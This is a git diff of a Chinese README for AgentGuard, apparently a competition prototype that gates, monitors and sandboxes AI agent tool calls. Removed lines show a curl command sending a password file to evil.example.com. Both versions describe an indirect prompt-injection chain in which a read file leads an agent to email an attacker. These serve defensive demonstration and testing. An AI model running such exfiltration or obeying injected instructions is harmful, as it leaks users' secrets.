@@ -1,58 +1,63 @@
-﻿# Agent-Authorization / AgentGuard
+# AgentGuard：面向 AI Agent 工具调用的授权网关与沙箱审计系统
 
-> 面向 AI Agent 工具调用场景的安全授权、运行时监控与可审计证据系统。  
-> 项目通过 Capability Contract、Runtime Monitor、Semantic Guard、Sandbox Executor、Data-flow Security Graph、Integrity Chain、Benchmark Dashboard、Naive Baseline 对比评测证据包，构建一套可解释、可复现、可展示的 Agent 工具调用安全防护原型。
+> 仓库目录名为 `Agent-Authorization`，作品正式名称建议使用 **AgentGuard**。  
+> 本项目面向 AI Agent 工具调用场景，在 Agent 与真实工具之间加入授权网关、Tool Proxy、Capability Token、运行时监控、沙箱执行与审计证据链，防止智能体越权读取、敏感数据外发、危险命令执行和不可追溯操作。
 
 ---
 
 ## 1. 项目定位
 
-随着 AI Agent 从“回答问题”走向“调用工具”，它可能执行以下高风险操作：
+随着 AI Agent 从“回答问题”发展到“调用工具”，模型输出可能直接影响文件、邮件、数据库、命令行和网络接口。传统权限控制通常只判断“用户有没有权限”，但在 Agent 场景下，还必须进一步判断：
 
-- 读取文件；
-- 写入或删除文件；
-- 执行 Shell 命令；
-- 发送邮件；
-- 查询数据库；
-- 调用网络工具；
-- 处理来自外部文件、网页或消息中的提示内容。
-
-传统权限控制通常只判断“用户有没有权限”，但在 Agent 场景中还必须进一步判断：
-
-Agent 这一步工具调用是否符合当前任务？
+```text
+这一次工具调用是否符合当前任务？
 工具参数是否越权？
-数据是否从不可信来源传播到了危险工具？
-是否存在提示注入、策略绕过、凭证访问、数据外发？
+数据是否从低可信来源传播到了危险工具？
+是否存在提示注入、路径绕过、凭证访问或数据外发？
 是否需要人工确认？
-是否能够留下可复查证据？
+是否能够留下可复盘证据？
+```
 
 AgentGuard 的核心思想是：
 
-不信任 Agent 的直接执行结果，将所有工具调用纳入外部安全网关和运行时监控统一控制。
+```text
+Agent 只负责提出工具调用计划；
+真正能否执行，由独立 Gateway、Capability Token、Runtime Monitor 和 Sandbox 共同决定。
+```
+
+本项目不是普通聊天机器人，也不是单纯 OAuth 实现，而是一套 **AI Agent 工具调用前置授权与运行时安全控制系统**。
 
 ---
 
-## 2. 概括
-
-AgentGuard 是一个面向 AI Agent 工具调用的安全中间层：
+## 2. 系统主链路
 
 ```text
-Agent 规划工具调用
-        ↓
-Capability Contract 限定任务能力边界
-        ↓
-Runtime Monitor 逐步检查工具调用
-        ↓
-Semantic Guard 识别语义风险
-        ↓
-Data-flow Graph 追踪标签传播和高风险流
-        ↓
-allow / confirm / deny
-        ↓
-Sandbox Executor 执行允许的工具
-        ↓
-Integrity Chain + Evidence Pack 生成可验证证据
+User Task
+   ↓
+AI Agent / External Agent
+   ↓
+Tool Proxy / Adapter
+   ↓
+OAuth-style Scope Check
+   ↓
+Gateway + Task Boundary Guard
+   ↓
+Capability Token 两阶段授权
+   ↓
+Runtime Monitor / Attack Chain Detector
+   ↓
+Hybrid Sandbox 执行允许的工具
+   ↓
+Audit Evidence / Hash Chain 留证
 ```
+
+系统最终对每一次工具调用输出三态决策：
+
+| 决策 | 含义 |
+|---|---|
+| `allow` | 低风险，允许进入受控执行流程 |
+| `confirm` | 中风险或存在副作用，需要人工确认 |
+| `deny` | 高风险、越权或策略违规，拒绝执行 |
 
 ---
 
@@ -60,490 +65,503 @@ Integrity Chain + Evidence Pack 生成可验证证据
 
 | 能力 | 说明 |
 |---|---|
-| Gateway 前置授权 | 对单次工具调用进行角色、路径、工具、参数、风险评分判断 |
-| Capability Contract | 将用户任务编译成最小权限能力合约，限制工具和资源边界 |
-| Runtime Monitor | 多步 Agent 执行过程中逐步检查风险、标签和风险预算 |
-| Semantic Guard | 对数据外发、凭证访问、策略绕过、提示注入等自然语言风险进行检测 |
-| Sandbox Executor | 只有 `allow` 的工具调用才进入沙箱执行 |
-| Attack Chain Detection | 识别多步攻击链，例如公开文件读取后诱导外发 |
-| Data-flow Security Graph | 将 case、step、sink 和标签传播转化为安全图谱 |
-| SVG Graph Viewer | 将安全图谱渲染为可视化节点图，便于答辩展示 |
-| Integrity Chain | 为 Benchmark 报告生成 SHA-256 哈希链，检测证据篡改 |
-| Naive Baseline 对比 | 量化无防护 Agent 与 AgentGuard 的安全差异 |
-| Benchmark Dashboard | 前端展示通过率、攻击缓解率、图谱摘要、完整性状态 |
-| Competition Evidence Pack | 自动生成 Markdown / JSON 竞赛证据包 |
+| Gateway 前置授权 | 对单次工具调用进行工具、参数、角色、路径、内容、命令、SQL、风险分和任务边界检查 |
+| Tool Proxy | 统一接入外部 Agent 工具调用，并执行 OAuth-style scope 初筛与两阶段授权 |
+| OAuth-style Scope Check | 检查外部 Agent 声明权限是否覆盖本次工具调用需求，但不作为最终执行授权 |
+| Capability Token | 将授权绑定到用户、Agent 平台、原始任务、工具、参数和 sandbox profile，防止授权后篡改或重放 |
+| Task Boundary Guard | 判断当前工具调用是否偏离用户原始任务和临时授权边界 |
+| Runtime Monitor | 维护多步任务状态，记录步骤、风险、标签传播和数据流关系 |
+| Attack Chain Detector | 识别“提示注入 → 敏感访问 → 外部发送 / 高危命令”等组合攻击链 |
+| Hybrid Sandbox | 有 Docker 时使用 Docker Sandbox；无 Docker 时自动 fallback 到 Native Subprocess Sandbox |
+| Audit Evidence | 记录每次授权、拒绝、执行、证据 hash 和可复盘原因 |
+| React/Vite 前端 | 提供授权演示、运行证据、测试报告和项目说明四个提交版页面 |
+| 独立测试模块 | `python -m test.run` 自动读取 `test/cases/gateway_cases*.json` 并生成结构化评测结果 |
+| GitHub Actions CI | 自动执行后端回归测试、Gateway 样例评测和前端构建 |
 
 ---
 
-## 4. 快速开始
+## 4. 快速启动
 
-### 4.1 创建虚拟环境
+以下命令建议在 Windows PowerShell 中执行。
+
+### 4.1 进入项目目录
+
+```powershell
+cd Agent-Authorization
+```
+
+### 4.2 创建并激活虚拟环境
 
 ```powershell
 python -m venv venv
 .\venv\Scripts\Activate.ps1
 ```
 
-### 4.2 安装依赖
+如 PowerShell 阻止脚本执行，可先运行：
 
 ```powershell
-pip install -r requirements.txt
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy RemoteSigned
 ```
 
-### 4.3 一键生成证据
+### 4.3 安装后端依赖
 
 ```powershell
-.\scripts\run_competition_evidence.ps1
+python -m pip install --upgrade pip
+python -m pip install -r requirements.txt
 ```
 
-该脚本会自动执行：
+### 4.4 安装前端依赖
+
+```powershell
+npm install --prefix ".\frontend"
+```
+
+也可以进入前端目录安装：
+
+```powershell
+cd ".\frontend"
+npm install
+cd ..
+```
+
+### 4.5 一键启动项目
+
+```powershell
+python .\start_project.py --clean
+```
+
+启动后访问：
 
 ```text
-1. 离线 Runtime Benchmark
-2. 竞赛证据包生成
-3. 关键测试
-4. 输出 Dashboard 启动提示
+前端页面：http://localhost:5173
+后端接口：http://127.0.0.1:8000
+接口文档：http://127.0.0.1:8000/docs
 ```
 
-### 4.4 启动后端
+> 本机浏览器优先打开 `http://localhost:5173` 或 `http://127.0.0.1:5173`，不要使用 Vite 输出的虚拟网卡 Network 地址。
 
-```powershell
-python -m uvicorn backend.main:app --reload --host 127.0.0.1 --port 8000
-```
+---
 
-浏览器访问：
+## 5. 推荐演示路线
+
+前端提交版已经收敛为四个主页面：
 
 ```text
-http://127.0.0.1:8000/benchmark-dashboard
+1. 授权演示
+2. 运行证据
+3. 测试报告
+4. 项目说明
+```
+
+### 5.1 授权演示
+
+进入 **授权演示** 页面，建议依次点击：
+
+```text
+真沙箱读取
+敏感文件拦截
+OAuth 外发拒绝
+```
+
+讲解重点：
+
+```text
+Agent 提出工具调用
+→ Tool Proxy 统一入口
+→ Gateway 判断 allow / confirm / deny
+→ Capability Token 绑定授权
+→ Hybrid Sandbox 受控执行
+→ Audit Evidence 留证
+```
+
+### 5.2 运行证据
+
+进入 **运行证据** 页面，点击“刷新数据”。该页面读取本机真实运行数据，包括：
+
+```text
+logs/audit.log
+runtime_workspace/native_sandbox_runs/
+runtime_workspace/sandbox_runs/
+test/results/latest_summary.json
+```
+
+讲解重点：系统不是只显示固定 mock 数据，而是会根据本地审计日志、沙箱 evidence 和测试结果动态聚合指标。
+
+### 5.3 测试报告
+
+进入 **测试报告** 页面，点击“一键运行测试”。当前独立测试模块读取：
+
+```text
+test/cases/gateway_cases*.json
+```
+
+并输出：
+
+```text
+test/results/latest_summary.json
+test/results/latest_cases.json
+test/results/latest_detail.csv
+test/results/latest_report.md
+test/results/latest_dashboard.html
+```
+
+当前提交版评测目标：
+
+```text
+131 cases
+131 passed
+0 failed
+100.00% 样例通过率
+100.00% 风险阻断/确认率
+0.00% 风险误放行率
+0.00% 正常误拒率
+```
+
+### 5.4 项目说明
+
+进入 **项目说明** 页面，重点讲清楚：
+
+```text
+NoGuard：Agent 生成工具调用后直接执行，风险最高。
+OAuth-only：只能说明权限声明，不足以判断当前任务、参数和数据流是否安全。
+AgentGuard：在 scope 之后继续检查 Gateway、任务边界、Token、Runtime、Sandbox 和 Audit Evidence。
 ```
 
 ---
 
-## 5. 演示路线
+## 6. 提交前验证命令
 
-给指导老师或评委展示时，建议按以下顺序：
-
-```text
-1. 运行一键脚本
-   .\scripts\run_competition_evidence.ps1
-
-2. 打开 Benchmark Dashboard
-   http://127.0.0.1:8000/benchmark-dashboard
-
-3. 展示关键指标
-   - Benchmark 样例数
-   - 通过率
-   - 攻击缓解率
-   - 高风险流缓解率
-   - 阻止危险执行次数
-   - Integrity VALID
-
-4. 点击某个攻击 case 的“查看图谱”
-   展示数据从 file.read 流向 email.send / shell.run 等危险 sink 的过程
-
-5. 打开 Results/EvidencePack_XXX.md
-   展示完整性哈希、防护覆盖矩阵、Baseline 对比、代表性案例
-
-6. 说明 AgentGuard 与普通 Agent 的区别
-   普通 Agent 会直接执行计划步骤；
-   AgentGuard 会在每一步进行合约、语义、数据流和运行时检查。
-```
-
----
-
-## 6. 系统架构
-
-```text
-User Task
-   ↓
-Agent Planner
-   ↓
-Capability Contract Compiler
-   ↓
-Task Session
-   ↓
-Runtime Monitor
-   ↓
-Gateway Policy Engine + Semantic Guard + Data-flow Label Tracker
-   ↓
-allow / confirm / deny
-   ↓
-Sandbox Tool Executor / Human Confirmation / Blocked
-   ↓
-Audit Evidence
-   ↓
-Security Graph + Benchmark Report + Integrity Chain
-   ↓
-Effectiveness Evaluation + Coverage Matrix
-   ↓
-Evidence Pack + Dashboard
-```
-
----
-
-## 7. 核心安全机制
-
-### 7.1 Gateway 前置授权
-
-Gateway 会综合判断：
-
-- 用户身份和角色；
-- 工具类型；
-- 必要参数；
-- 路径风险；
-- 敏感资源；
-- Shell 命令风险；
-- SQL 风险；
-- 邮件外发风险；
-- Prompt Injection；
-- Agent 计划置信度；
-- 策略文件自保护；
-- Semantic Guard 风险标签。
-
-输出三类决策：
-
-| 决策 | 含义 |
-|---|---|
-| `allow` | 低风险且符合任务能力边界，允许自动执行 |
-| `confirm` | 中风险或需要人工确认 |
-| `deny` | 高风险、越权、破坏性或明确违规，直接拒绝 |
-
-### 7.2 Capability Contract
-
-Capability Contract 用于把用户任务转化为最小权限边界：
-
-- 本次任务允许哪些工具；
-- 允许访问哪些资源；
-- 禁止访问哪些路径；
-- 是否允许外发；
-- 是否需要人工确认；
-- 最大步骤数；
-- 风险预算。
-
-它解决的问题是：
-
-```text
-Agent 即使拥有多个工具，也只能在当前任务允许的范围内使用工具。
-```
-
-### 7.3 Runtime Monitor
-
-Runtime Monitor 在多步任务中逐步检查每个工具调用，而不是一次性相信 Agent 的完整计划。
-
-典型攻击链：
-
-```text
-Step 1: file.read public/notice.txt
-        ↓
-文件内容中包含隐藏提示注入
-        ↓
-Step 2: email.send attacker@example.com
-        ↓
-Runtime Monitor 根据 tainted / prompt_injection 标签触发 confirm 或 deny
-```
-
-### 7.4 Semantic Guard
-
-Semantic Guard 用于识别自然语言风险意图，包括：
-
-- 数据外发；
-- 凭证访问；
-- 策略绕过；
-- Prompt Injection；
-- 破坏性操作；
-- 网络滥用；
-- 权限提升。
-
-当前实现采用“确定性降级检测优先 + Embedding 可选增强”的方式，避免比赛现场因为模型不可用导致语义模块失效。
-
-### 7.5 Data-flow Security Graph
-
-每个 Benchmark case 会生成安全图谱：
-
-```text
-case node → step node → step node → sink node
-```
-
-图谱记录：
-
-- 工具调用节点；
-- step 之间的数据流边；
-- input_labels / output_labels；
-- tainted / prompt_injection / sensitive / secret 等标签传播；
-- 高风险流 high_risk_flows；
-- sink 工具，例如 email.send、shell.run、db.query、file.write、file.delete。
-
-### 7.6 Integrity Chain
-
-Benchmark 报告会附加 SHA-256 完整性清单：
-
-- report hash；
-- case hash；
-- step hash；
-- case-level hash chain；
-- root hash。
-
-如果报告、case、step 或 security_graph 被事后篡改，完整性校验会失败。
-
-### 7.7 AgentGuard vs Naive Baseline
-
-项目会构造 naive baseline：
-
-```text
-普通 Agent 直接执行所有计划工具调用，
-不进行合约检查、运行时监控、语义检测、数据流追踪和人工确认。
-```
-
-然后与 AgentGuard 对比：
-
-- 攻击缓解率；
-- 正常任务可用率；
-- 高风险流缓解率；
-- 阻止危险执行次数；
-- 综合有效性评分。
-
----
-
-## 8. Benchmark 与证据输出
-
-### 8.1 离线 Benchmark
-
-运行：
+### 6.1 独立 Gateway 样例测试
 
 ```powershell
-python experiments\run_llm_runtime_benchmark.py
+python -m test.run
 ```
 
-输出：
+预期输出示例：
 
 ```text
-Results/Result_XXX.json
-Results/Result_XXX.html
+=== Agent-Authorization Test Finished ===
+cases: 131
+passed: 131
+failed: 0
+accuracy: 100.00%
+risk_block_or_confirm: 100.00%
+risk_unsafe_allow: 0.00%
+normal_false_deny: 0.00%
 ```
 
-特点：
-
-- 不依赖真实 LLM API；
-- 复用真实 Runtime Monitor 和 Sandbox Executor；
-- 可重复运行；
-- 结果自动编号；
-- 报告包含 security_graph、effectiveness、integrity 等字段。
-
-### 8.2 竞赛证据包
-
-运行：
+### 6.2 后端授权回归测试
 
 ```powershell
-python experiments\generate_competition_evidence_pack.py
+python scripts/run_backend_authorization_tests.py
 ```
 
-输出：
+预期结果：
 
 ```text
-Results/EvidencePack_XXX.json
-Results/EvidencePack_XXX.md
+44 passed
 ```
 
-证据包包含：
-
-- 核心指标；
-- 完整性校验；
-- 防护覆盖矩阵；
-- AgentGuard vs Naive Baseline；
-- 代表性攻击案例；
-- 高风险数据流；
-- 可复现命令；
-- 答辩展示建议。
-
-### 8.3 一键流水线
+### 6.3 前端构建检查
 
 ```powershell
-.\scripts\run_competition_evidence.ps1
+npm --prefix ".\frontend" run build
+```
+
+如果 `--prefix` 在本地环境中不稳定，可使用：
+
+```powershell
+cd ".\frontend"
+npm run build
+cd ..
 ```
 
 ---
 
-## 9. 防护覆盖矩阵
+## 7. GitHub Actions CI
 
-当前覆盖矩阵统计以下防护层：
+项目已配置 GitHub Actions 自动检查流程，位于：
 
-| 防护层 | 说明 |
-|---|---|
-| `capability_contract` | 任务级最小权限合约 |
-| `runtime_monitor` | 多步运行时授权与风险预算检查 |
-| `semantic_guard` | 语义风险检测 |
-| `data_flow_graph` | 数据流图谱与高风险流证据 |
-| `integrity_chain` | SHA-256 证据完整性哈希链 |
-| `effectiveness_baseline` | AgentGuard vs naive baseline 对比 |
-| `sandbox_executor` | 沙箱工具执行 |
+```text
+.github/workflows/ci.yml
+```
 
-攻击面覆盖包括：
+触发条件：
 
-| 攻击面 | 工具类型 |
-|---|---|
-| file | file.read / file.write / file.delete |
-| email | email.send |
-| shell | shell.run / code.exec / run_code |
-| database | db.query |
-| network | http.post / http.get |
+```text
+push 到 main
+pull_request 到 main
+手动 workflow_dispatch
+```
+
+CI 会依次执行：
+
+```text
+1. Checkout repository
+2. Set up Python 3.11
+3. Install requirements.txt
+4. python scripts/run_backend_authorization_tests.py
+5. python -m test.run --case-dir test/cases --output-dir test/results
+6. Set up Node.js 20
+7. npm install --no-audit --no-fund
+8. npm run build
+9. Upload test/results/** as artifact
+```
+
+该流程用于保证每次提交后：
+
+```text
+后端授权逻辑没有回归
+Capability Token 和两阶段授权仍然有效
+Gateway 样例测试可通过
+React/Vite 前端可以正常构建
+测试结果可以作为 artifact 下载复盘
+```
 
 ---
 
-## 10. 项目结构
+## 8. 主要目录结构
 
 ```text
 Agent-Authorization/
-├── backend/
-│   ├── agents/
-│   ├── capability/
-│   ├── evidence/
-│   ├── gateway/
-│   ├── routes/
-│   ├── runtime/
-│   ├── task_session/
-│   └── tools/
+├── backend/                    # FastAPI 后端
+│   ├── gateway/                # Gateway 授权网关核心逻辑
+│   ├── proxy/                  # Tool Proxy 与外部 Agent 授权入口
+│   ├── real_agent/             # 真实 LLM tool-calling 适配
+│   ├── capability/             # Capability Contract v2
+│   ├── guardrails/             # Task Boundary 与 Capability Token
+│   ├── runtime/                # Runtime Monitor 与安全图谱
+│   ├── attack_chain/           # 多步攻击链检测
+│   ├── audit/                  # 审计日志与哈希链校验
+│   ├── approval/               # 人工确认模块
+│   ├── sandbox/                # Docker / Native / Hybrid Sandbox
+│   ├── tools/                  # 受控工具执行逻辑
+│   └── routes/                 # API 路由
 │
 ├── config/
-├── docs/
-├── experiments/
-├── frontend/
-├── scripts/
-├── security_cases/
-├── tests/
-├── Results/
-├── Task/
-├── requirements.txt
+│   ├── policy.yaml             # 核心策略配置
+│   └── semantic_guard.yaml     # 语义风险配置
+│
+├── frontend/                   # React + Vite 前端
+│   └── src/
+│       ├── pages/              # 授权演示 / 运行证据 / 测试报告 / 项目说明
+│       ├── components/         # 页面组件
+│       └── services/           # API 调用封装
+│
+├── test/                       # 独立 Gateway 样例评测模块
+│   ├── cases/                  # gateway_cases*.json
+│   ├── results/                # latest_summary / cases / detail / report / dashboard
+│   └── run.py                  # python -m test.run
+│
+├── tests/                      # pytest 后端回归测试
+├── runtime_workspace/          # 本地沙箱工作区
+├── docs/                       # 项目文档与阶段性材料
+├── .github/workflows/          # GitHub Actions CI
+├── start_project.py            # 一键启动脚本
 └── README.md
 ```
 
 ---
 
-## 11. 常用命令
+## 9. 关键 API 概览
 
-### 运行全部测试
+| 模块 | 接口 | 说明 |
+|---|---|---|
+| 状态检查 | `GET /api/status` | 查看后端状态和已注册能力 |
+| Gateway | `POST /gateway/check` | 对单次工具调用进行 allow / confirm / deny 判断 |
+| Gateway | `POST /gateway/call` | 授权后执行、确认或拒绝工具调用 |
+| Tool Proxy | `POST /tool-proxy/authorize` | 外部 Agent 统一授权入口 |
+| 两阶段授权 | `POST /tool-proxy/two-phase/prepare` | 第一阶段授权检查并签发 Capability Token |
+| 两阶段授权 | `POST /tool-proxy/two-phase/execute` | 第二阶段校验 Token 并进入沙箱执行 |
+| Capability Token | `POST /tool-proxy/capability-token/status` | 查看 token 状态 |
+| Capability Token | `POST /tool-proxy/capability-token/events` | 查看 token issue / consume 事件 |
+| 真实 LLM 接入 | `POST /real-agent/tool-call/run` | 接收 OpenAI-compatible tool_calls / function_call |
+| Native Sandbox | `POST /sandbox-native/execute` | 在 Native Subprocess Sandbox 中执行工具 |
+| Native Sandbox | `GET /sandbox-native/runs` | 查看本地沙箱运行记录 |
+| Docker Sandbox | `POST /sandbox-docker/execute` | 在 Docker Sandbox 中执行工具 |
+| 测试结果 | `GET /test-results/latest/summary` | 读取最新独立测试摘要 |
+| 前端聚合数据 | `GET /api/overview` | 聚合本地 audit、sandbox evidence 和测试摘要 |
+| 前端聚合数据 | `GET /api/requests` | 读取最近本地授权 / 沙箱记录 |
+| 前端聚合数据 | `GET /api/audit-logs` | 读取本地审计时间线 |
+
+---
+
+## 10. 测试样例说明
+
+当前独立测试入口为：
 
 ```powershell
-python -m pytest tests -q
+python -m test.run
 ```
 
-### 运行 Benchmark
-
-```powershell
-python experiments\run_llm_runtime_benchmark.py
-```
-
-### 生成证据包
-
-```powershell
-python experiments\generate_competition_evidence_pack.py
-```
-
-### 一键执行证据流水线
-
-```powershell
-.\scripts\run_competition_evidence.ps1
-```
-
-### 启动服务
-
-```powershell
-python -m uvicorn backend.main:app --reload --host 127.0.0.1 --port 8000
-```
-
-### 打开 Dashboard
+测试脚本会自动读取：
 
 ```text
-http://127.0.0.1:8000/benchmark-dashboard
+test/cases/gateway_cases*.json
+```
+
+当前样例覆盖方向包括：
+
+```text
+正常公开文件读取
+公开目录写入
+只读数据库查询
+提示注入
+路径穿越
+URL 编码绕过
+Windows / Linux 绝对路径
+secret / private / .env 敏感资源访问
+外部邮件敏感内容外发
+HTTP webhook / 外部 API 外发
+高危 shell / PowerShell / curl / wget
+危险 SQL / SQL 注入
+未知工具 fail closed
+低置信度计划
+Capability Contract 边界
+外部 Agent / OAuth-style 场景
+Hybrid Sandbox 边界
+多步攻击链
+```
+
+测试输出用于前端“测试报告”页面和作品报告实验数据。
+
+---
+
+## 11. 沙箱说明
+
+项目实现 Hybrid Sandbox：
+
+```text
+有 Docker：优先使用 Docker Sandbox
+无 Docker：自动 fallback 到 Native Subprocess Sandbox
+```
+
+### Docker Sandbox
+
+Docker Sandbox 提供更强的执行隔离能力，典型限制包括：
+
+```text
+--network none
+--read-only
+--cap-drop ALL
+--security-opt no-new-privileges
+内存 / CPU / PID 限制
+临时目录 tmpfs
+```
+
+### Native Subprocess Sandbox
+
+Native Subprocess Sandbox 不依赖 Docker，适合本地演示和比赛复现。它通过以下方式限制执行：
+
+```text
+受限子进程
+工具白名单
+路径白名单
+写入目录限制
+命令白名单
+超时控制
+evidence.json 证据文件
+```
+
+需要说明：
+
+```text
+Native Subprocess Sandbox 是轻量级本地执行沙箱，不声称等同于 Docker、gVisor 或 Firecracker 级别的系统强隔离。
 ```
 
 ---
 
-## 12. 代表性安全场景
+## 12. 运行证据数据来源
 
-### 12.1 正常读取公开文件
+前端“运行证据”页面读取本地真实运行数据，不再以固定 mock 数据作为主来源。
+
+主要数据源：
 
 ```text
-用户请求读取 public/notice.txt
-→ Capability Contract 授予 file.read
-→ Runtime Monitor 允许
-→ Sandbox Executor 执行
-→ final_decision = allow
+logs/audit.log
+runtime_workspace/native_sandbox_runs/
+runtime_workspace/sandbox_runs/
+test/results/latest_summary.json
+config/policy.yaml
 ```
 
-### 12.2 读取敏感文件
+当用户运行授权演示、真沙箱执行或一键测试后，刷新运行证据页面即可看到本地数据变化。
+
+---
+
+## 13. 当前系统边界
+
+本项目当前是信安赛参赛原型，边界如下：
 
 ```text
-用户请求读取 secret/password.txt
-→ 路径命中敏感资源
-→ Gateway / Runtime Monitor 拒绝
-→ final_decision = deny
-```
-
-### 12.3 间接提示注入
-
-```text
-Step 1: 读取公开文件
-Step 2: 文件内容诱导 Agent 外发数据
-Step 3: Runtime Monitor 发现 tainted / prompt_injection 流向 email.send
-→ confirm 或 deny
-```
-
-### 12.4 破坏性 SQL
-
-```text
-db.query DROP TABLE notices
-→ SQL hard deny
-→ final_decision = deny
-```
-
-### 12.5 危险 Shell 外联
-
-```text
-shell.run curl http://evil.example.com --data @secret/password.txt
-→ 命中危险命令与数据外发风险
-→ final_decision = deny
+1. 不训练或微调大模型本身。
+2. 不声称识别所有自然语言攻击变体。
+3. 当前实验结论仅对已构建的样例集和原型实现成立。
+4. Native Subprocess Sandbox 是本地 fallback，不是系统级强隔离。
+5. WorkBuddy、OpenClaw 等外部 Agent 主要作为接入场景和协议模拟，不代表已完成官方平台深度集成。
+6. 真实 LLM tool-calling 接入提供 OpenAI-compatible 格式适配入口，生产级多模型长期稳定性评测属于后续工作。
+7. 100% 测试通过率表示当前 131 条样例范围内的结果，不代表真实世界全场景绝对安全。
 ```
 
 ---
 
-## 13. 当前边界
+## 14. 答辩讲解建议
 
-当前项目仍是原型，不等同于生产级安全系统。主要边界包括：
-
-- 沙箱隔离仍需继续增强；
-- 语义检测不能保证覆盖所有隐蔽攻击；
-- 当前 Benchmark 仍是自定义离线样例库；
-- 真实 Agent 生态接入还需要进一步扩展，例如 MCP、LangChain、OpenAI Function Calling；
-- EvidencePack 适合竞赛展示，但正式生产环境还需要更完整的审计存储和访问控制；
-- 网络工具、浏览器自动化和 Git 操作等更复杂工具场景仍待扩展。
-
----
-
-## 14. 后续规划
-
-优先级较高的后续工作：
-
-1. 新增消融实验：naive / rule only / semantic / contract runtime / full AgentGuard；
-2. 接入真实 Agent Adapter：OpenAI Function Calling、LangChain、MCP；
-3. 增强沙箱隔离：超时、输出限制、网络禁用、命令白名单；
-4. 扩充攻击样例库：Git 泄露、浏览器自动化、MCP 工具越权、网络请求滥用；
-5. 增加 GitHub Actions CI；
-6. 优化 Dashboard 首页，形成统一演示入口；
-7. 为 Evidence 结构增加 Pydantic Schema，提升字段稳定性。
-
----
-
-## 15. 项目价值
-
-AgentGuard 的价值在于，它将 AI Agent 工具调用从“直接执行”转变为“受控执行”：
+可以用下面这段话快速介绍项目：
 
 ```text
-工具调用前有授权，
-工具调用中有监控，
-工具调用后有证据，
-攻击链路可解释，
-评测结果可复现，
-证据报告可验真。
+AgentGuard 解决的是 AI Agent 调用真实工具时的授权和安全边界问题。
+普通 Agent 生成工具调用后可能直接执行，容易造成越权读取、敏感数据外发或危险命令执行。
+我们的系统把 Agent 的规划权和工具执行权分离：Agent 只能提出计划，所有工具调用必须经过 Tool Proxy、Gateway、Capability Token、Runtime Monitor 和 Hybrid Sandbox，最终输出 allow、confirm 或 deny，并留下可审计证据。
 ```
 
-这使项目不仅是一个安全网关 demo，而是一个围绕 AI Agent 工具调用安全构建的可测试、可展示、可扩展的原型系统。
+对比 OAuth 时可以说：
+
+```text
+OAuth 主要解决“外部应用是否被授权访问某类资源”；
+AgentGuard 进一步解决“当前任务、当前参数、当前数据流和当前执行环境下，这一次工具调用是否安全”。
+```
+
+---
+
+## 15. 常用命令汇总
+
+```powershell
+# 启动项目
+python .\start_project.py --clean
+
+# 独立样例测试
+python -m test.run
+
+# 后端授权回归测试
+python scripts/run_backend_authorization_tests.py
+
+# 前端构建
+npm --prefix ".\frontend" run build
+
+# 后端健康检查
+Invoke-RestMethod http://127.0.0.1:8000/api/status
+
+# Native Sandbox 健康检查
+Invoke-RestMethod http://127.0.0.1:8000/sandbox-native/health
+
+# 最新测试摘要
+Invoke-RestMethod http://127.0.0.1:8000/test-results/latest/summary
+```
+
+---
+
+## 16. 项目总结
+
+AgentGuard 的核心价值不在于声称“完全解决 Agent 安全”，而在于提供了一条清晰可运行、可解释、可复现的工程路径：
+
+```text
+让模型负责规划；
+让独立网关负责授权；
+让 Capability Token 绑定单次执行；
+让运行时监控负责上下文风险；
+让沙箱限制真实执行；
+让审计系统负责证据复盘。
+```
+
+该系统为 AI Agent 工具调用安全落地提供了一个可展示、可测试、可持续扩展的实践样板。
